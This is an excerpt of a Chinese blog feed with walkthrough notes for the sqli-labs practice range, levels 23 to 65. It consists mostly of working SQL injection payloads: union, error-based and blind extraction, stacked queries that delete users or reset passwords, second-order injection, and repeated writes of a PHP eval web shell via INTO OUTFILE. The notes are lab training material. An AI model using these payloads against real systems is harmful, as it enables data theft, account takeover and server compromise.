class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_8581</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="number">0x7e</span>,secret_8581,<span class="number">0x7e</span>),<span class="number">3</span> <span class="keyword">from</span> w4xiim6dlu <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>取得数据<br><code>~rfulceyVFxsq51j1yq7kGt8D~</code></p><hr><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>探测闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 --+ 正常</span></span><br></pre></td></tr></table></figure><p>剩下的和上一关一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;icq1mwfl07&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,group_concat(0x7e,secret_TVEL,0x7e),3 from icq1mwfl07 --+</span></span><br></pre></td></tr></table></figure><hr><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>探测闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;  --+</span><br></pre></td></tr></table></figure><p>双引号闭合<br>剩下的和上几关一样，不再演示</p><hr><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>这关只有五次<br>根据爆错可以看到是单引号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure><p>没反应，试试报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database()),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure><p>芜湖，成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="number">1</span>m0z0tx769<span class="string">&#x27; limit 2,2 ),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure><p><code>Subquery returns more than 1 row</code><br>欸草，limit 用错了，要被笑了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span>zdim9qe7y5<span class="string">&#x27; LIMIT 2,1 ),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,(concat(0x7e,(select concat(secret_QZZ8) from zdim9qe7y5),0x7e)),1) --+</span></span><br></pre></td></tr></table></figure><p>ok</p><hr><h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>这题通过报错是数字型注入<br>其余和上题一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;rqkli61x10&#x27;</span> LIMIT <span class="number">2</span>,<span class="number">1</span> ),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> updatexml(<span class="number">1</span>,(concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> concat(secret_V2XX) <span class="keyword">from</span> rqkli61x10),<span class="number">0x7e</span>)),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>get<code>~KM85Q1UPRPyyBUCX0iEIl3fy~</code></p><hr><h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>通过报错信息可知闭合方式为”)，其余操作和上题一样<br>不再记录</p><hr><h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>通过报错信息可知闭合方式为’))，其余操作和上题一样<br>不再记录</p><hr><h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>通过测试闭合方式得出是’)闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><p>没反应，嗯当然不可能手动盲注啊<br>接下来，掏出我们的sqlmap跑一遍</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.98.133/sqli/Less-62/?id=1&quot; <span class="operator">-</span>D challenges <span class="comment">--tables</span></span><br></pre></td></tr></table></figure><p>跑了一会，emmm，sqlmap会跑超限制，可以用burp爆破<br>这里不再演示好吧<br>或者直接写shell玩吧</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,&quot;&lt;?php eval($_POST[x]);?&gt;&quot;,3 into outfile &quot;C:\\PHPStudy\\WWW\\sqli\\Less-62\\1.php&quot;--+</span></span><br></pre></td></tr></table></figure><p>我太难了</p><hr><h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>探测闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="string">&#x27; || sleep(5) --+</span></span><br></pre></td></tr></table></figure><p>接下来盲注跑吧</p><hr><h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>探测闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # 正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> # 错误</span><br></pre></td></tr></table></figure><p>是数字型注入，剩下就是跑盲注</p><hr><h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>探测注入方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=1 and (&quot;<span class="number">1</span> 正常</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and 1=2 and (&quot;<span class="number">1</span> 错误</span><br></pre></td></tr></table></figure><p>是”)闭合，剩下接盲注跑</p><hr><p>之后的关卡并没有文件，因此，sqli-lab靶场系列笔记结束<br>ok，就这样吧</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Sqli-lab-过关笔记-Less-54-Less-65&quot;&gt;&lt;a href=&quot;#Sqli-lab-过关笔记-Less-54-Less-65&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab 过关笔记 Less 54-Less 65&quot;&gt;&lt;/a&gt;Sqli-lab 过关笔记 Less 54-Less 65&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Start Challenge&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="sqli-lab" scheme="http://0w0.host/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab Less 39-Less 53</title>
    <link href="http://0w0.host/2020/09/09/sqli-lab-Less-39-Less-53/"/>
    <id>http://0w0.host/2020/09/09/sqli-lab-Less-39-Less-53/</id>
    <published>2020-09-09T10:00:23.000Z</published>
    <updated>2020-09-10T14:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-39-Less-53"><a href="#Sqli-lab-过关笔记-Less-39-Less-53" class="headerlink" title="Sqli-lab 过关笔记 Less 39-Less 53"></a>Sqli-lab 过关笔记 Less 39-Less 53</h1><a id="more"></a><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这里加\后判断为数字型注入<br>因为是堆叠注入直接尝试删除用户Sunr</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">delete</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> &quot;Sunr&quot; #</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/8xHFoXUtyJmTGnv.png" alt="image.png"><br>发现并没有被删除</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="keyword">update</span> users <span class="keyword">set</span> password<span class="operator">=</span>&quot;admin&quot; <span class="keyword">where</span> username<span class="operator">=</span>&quot;Sunr&quot;; #</span><br></pre></td></tr></table></figure><p>我们来使用更新的话可以看到<br><img src="https://i.loli.net/2020/09/09/L3Bb5rfMkpKunZA.png" alt="image.png"><br>passwd成功更新</p><hr><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>测试闭合方式为单引号加小括号闭合<br>开始构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) ; update users set password=&quot;Sunr&quot; where username=&quot;Sunr&quot;; or (&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里我们不再构造第一个语句，直接尝试更新用户名密码<br><img src="https://i.loli.net/2020/09/09/ZE6vis3LtPj5hRN.png" alt="image.png"><br>成功</p><hr><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>首先探测闭合方式确定为数字型注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>; <span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-41/1.php&quot;; #</span><br></pre></td></tr></table></figure><p>这里我们尝试写入shell<br><img src="https://i.loli.net/2020/09/09/qzUVlPeynMDxcZ8.png" alt="image.png"><br>成功</p><hr><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>打开这一关又是熟悉的二次注入<br>试试创建新用户<br><img src="https://i.loli.net/2020/09/09/fb2tBWZysKXqU3Y.png" alt="image.png"><br>太鸡贼了，害<br>试试登录界面吧<br><img src="https://i.loli.net/2020/09/09/lfadW2RSUb9hup6.png" alt="image.png"><br>唔不行，用户名不行那就试试密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;#&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>嘿嘿，果然是密码不加过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-42/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>继续尝试写shell</p><p>成功</p><p>不过，，，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; select &quot;&lt;script&gt;alert(/1/)&lt;/script&gt;&quot; #</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/09/o2PrFykSJg6HGbs.png" alt="image.png"><br>可能我是闲得蛋疼吧</p><hr><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>又是一样的界面，例行进行探测闭合方式<br><code>&#39;)</code>闭合<br>同上题构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-43/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>还是熟悉的套路，首先探测闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>确定为单引号闭合<br>同上题构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-44/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>同上题，探测闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) or 1=1 #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>为<code>&#39;)</code>闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>login_password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;); select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; #&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><blockquote><p>注：以上写shell的条件均要满足Less-7的条件</p></blockquote><hr><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>又回到了熟悉的GET注入<br>又有提示：Please input parameter as SORT with numeric value<br>嗯，于是就改成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?sort<span class="operator">=</span>id</span><br></pre></td></tr></table></figure><p>探测一下闭合方式<br>估计大概的sql语句应该是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">value</span>;</span><br></pre></td></tr></table></figure><p>确实是典型的order by注入<br>我们来构造语句，我们直接使用报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure><p>成功爆出库</p><hr><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>首先探测出是单引号闭合<br>根据上题直接闭合构造语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功爆出库</p><hr><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>这次是盲注，没有报错提示不能使用报错注入<br>走一波时间盲注<br>探测为数字型<br>构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,<span class="number">1</span>,(<span class="keyword">select</span>(<span class="number">1</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">2</span>)))aaaa)) # </span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>同上，先判断闭合方式再构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||if(1=2,1,(select(1)from(select(sleep(2)))aaaa)) or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><hr><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>探测闭合为数字型后直接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure><p>居然成功了<br>然后感觉不太对，emmm<br>看了看源码发现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">if (mysqli_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">···</span><br></pre></td></tr></table></figure><p>这里执行sql语句的函数是mysqli_multi_query(),可以一次执行多条语句<br>也就是之前的堆叠注入，这里不再演示</p><hr><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>同上，先判断闭合方式再构造注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(0x7e,(select database()),0x7e),1);select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-45/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功<br>同样这也是用mysqli_multi_query()<br>存在堆叠注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-51/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><hr><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>这一题是盲注<br>其余同上，直接贴语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> ;<span class="keyword">select</span> &quot;&lt;?php eval($_POST[x]);?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:/PHPStudy/WWW/sqli/Less-52/1.php&quot;; <span class="comment">-- d d</span></span><br></pre></td></tr></table></figure><hr><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>同上，直接贴语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="string">&#x27;;select &quot;&lt;?php eval($_POST[x]);?&gt;&quot; into outfile &quot;C:/PHPStudy/WWW/sqli/Less-53/1.php&quot;; or &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Sqli-lab-过关笔记-Less-39-Less-53&quot;&gt;&lt;a href=&quot;#Sqli-lab-过关笔记-Less-39-Less-53&quot; class=&quot;headerlink&quot; title=&quot;Sqli-lab 过关笔记 Less 39-Less 53&quot;&gt;&lt;/a&gt;Sqli-lab 过关笔记 Less 39-Less 53&lt;/h1&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="http://0w0.host/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="笔记" scheme="http://0w0.host/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="渗透" scheme="http://0w0.host/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="sqli-lab" scheme="http://0w0.host/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab Less 23-Less 38</title>
    <link href="http://0w0.host/2020/09/06/Sqli-lab-Less-23-Less-38/"/>
    <id>http://0w0.host/2020/09/06/Sqli-lab-Less-23-Less-38/</id>
    <published>2020-09-06T09:17:51.000Z</published>
    <updated>2020-09-10T14:09:05.973Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-lab-过关笔记-Less-23-Less-38"><a href="#Sqli-lab-过关笔记-Less-23-Less-38" class="headerlink" title="Sqli-lab 过关笔记 Less 23-Less 38"></a>Sqli-lab 过关笔记 Less 23-Less 38</h1><a id="more"></a><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>首先测试语句闭合方式，熟悉的GET熟悉的配方不同的味道<br>输入单引号后爆错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>确实是单引号闭合<br>接着闭合单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 -- SSS </span></span><br></pre></td></tr></table></figure><p>爆出<code>SSS&#39; LIMIT 0,1</code><br>emm，既然这样闭合不行那就换个思路</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND 1=1 AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>页面无报错无回显<br><img src="https://i.loli.net/2020/09/06/TcoWmxla8qJhbL4.jpg" alt="2~R_V_F_YTE2_MIUKFL_X_M.jpg"><br>嘻嘻嘻接下来试试报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>爆出<code>XPATH syntax error: &#39;~security~&#39;</code>，成功</p><hr><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>嗯，看上去应该是二次注入</p><p>这是我的理解<br><img src="https://i.loli.net/2020/09/06/Uw8WFfAiQYr5gkC.png" alt="image.png"></p><p>知道上面简单的原理后先来注册一个新用户<br><img src="https://i.loli.net/2020/09/06/ad8iYHkBKItSN9z.png" alt="image.png"></p><p>提示<br><code>Redirecting you to login page in 5 sec................</code><br><code>If it does not redirect, click the home button on top right</code></p><p>我们去看看数据库存储的东西<br><img src="https://i.loli.net/2020/09/06/Ga7UI31LxB9NjWb.png" alt="image.png"><br>确实用户名被设置成了<code>admin&#39; --+</code></p><p>我们去登录这个用户，出现登录界面全白<br><img src="https://i.loli.net/2020/09/06/WpqC54PQ3gImDwA.png" alt="image.png"></p><p>清除cookies去点击重置密码出现<br><img src="https://i.loli.net/2020/09/06/aoiy2E48xtMmKGu.png" alt="image.png"></p><p>我淦nm，这玩个luan，，，<br>打开关卡目录发现<br><img src="https://i.loli.net/2020/09/06/GbWR4VBkhm1tNY7.png" alt="image.png"><br>恍然大悟<br><img src="https://i.loli.net/2020/09/06/TcoWmxla8qJhbL4.jpg" alt="2~R_V_F_YTE2_MIUKFL_X_M.jpg"><br>赶紧修复继续</p><p>登入后修改密码欸嘿<br><img src="https://i.loli.net/2020/09/06/nBgMjqb2zAk3Dut.png" alt="image.png"></p><p>然后碰到点小的问题<br>注释有点问题于是就改成<code>admin&#39;#</code><br>然后再次登录修改<br>这里被解释后就会把admin的密码更新为我们设置的密码<br><img src="https://i.loli.net/2020/09/06/PubKj3qLGNAe2tX.png" alt="image.png"></p><hr><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>判断闭合方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and 1=1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>回显了<br><code>Hint: Your Input is Filtered with following result: 1&#39; 1=1 &#39;1&#39;=&#39;1</code><br>过滤了and和or</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1=1 || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>回显<code>Hint: Your Input is Filtered with following result: 1&#39; </code><br>看来不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; %26%26 1=1 -- SS </span></span><br></pre></td></tr></table></figure><p>这时换个编码，欸嘿成功</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; %26%26 